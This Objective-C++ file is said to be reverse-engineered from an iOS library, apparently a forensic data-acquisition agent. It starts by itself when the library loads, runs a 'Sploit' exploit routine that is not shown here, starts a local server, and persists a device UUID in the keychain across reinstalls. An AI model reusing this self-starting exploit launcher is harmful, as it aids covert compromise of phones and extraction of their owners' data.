// autorun.mm - 自动运行入口
// 逆向自 libappcore.dylib (libappcore_autorun / libappcore_do_acquisition)
#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import <dlfcn.h>
#import "server/AcqViewCntrlr.h"
#import "acquisition/MetadataServer.h"

// 全局状态
static bool s_autorun_started = false;
static bool s_scheduled = false;
static bool s_ran = false;

// 全局变量 (逆向自 dylib)
NSString* g_agentVersion = @"2.6.1";
void* g_pcbBackupBuffer = NULL;
char g_execPathBuffer[1024];
char* g_execBasename = NULL;

// 保存 UUID 到钥匙串 (跨重装持久化)
void save_uuid_to_keychain(NSString* uuid) {
    NSDictionary* query = @{
        (__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
        (__bridge id)kSecAttrService: @"device_uuid",
        (__bridge id)kSecValueData: [uuid dataUsingEncoding:NSUTF8StringEncoding],
    };
    SecItemAdd((__bridge CFDictionaryRef)query, NULL);
}

// 调度采集任务 (后台线程)
void _ac_schedule_acquisition(void) {
    if (s_scheduled) return;
    s_scheduled = true;

    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_BACKGROUND, 0), ^{
        libappcore_do_acquisition();
    });
}

// 采集主流程
void libappcore_do_acquisition(void) {
    if (s_ran) return;
    s_ran = true;

    NSLog(@"[libappcore] entry: PID=%d PPID=%d", getpid(), getppid());

    // 获取执行路径
    uint32_t len = sizeof(g_execPathBuffer);
    _NSGetExecutablePath(g_execPathBuffer, &len);
    g_execBasename = strrchr(g_execPathBuffer, '/') + 1;

    // 检查设备支持性
    if (![IOSDeviceInfo IsSupported]) {
        dispatch_async(dispatch_get_main_queue(), ^{
            // 通知 UI
            NSNotificationCenter* nc = [NSNotificationCenter defaultCenter];
            [nc postNotificationName:@"AcquisitionNotViable" object:nil];
        });
        NSLog(@"Acquisition is not viable: device model or iOS version is not supported.");
        return;
    }

    // 运行漏洞利用
    AcqViewCntrlr_* controller = [[AcqViewCntrlr_ alloc] init];
    [controller Sploit];

    // 启动本地服务器
    [controller RunServer];
}

// 自动运行入口 (dylib 加载时通过 constructor 调用)
__attribute__((constructor))
void libappcore_autorun(void) {
    if (s_autorun_started) return;
    s_autorun_started = true;

    NSLog(@"[libappcore] autorun started");

    // 延迟启动，等待主程序初始化完成
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 3 * NSEC_PER_SEC),
                   dispatch_get_main_queue(), ^{
        _ac_schedule_acquisition();
    });
}

// Objective-C 类自动初始化
@interface _LibappcoreAutoInit : NSObject
@end

@implementation _LibappcoreAutoInit
+ (void)load {
    // 类加载时也触发自动运行 (双保险)
    libappcore_autorun();
}
@end
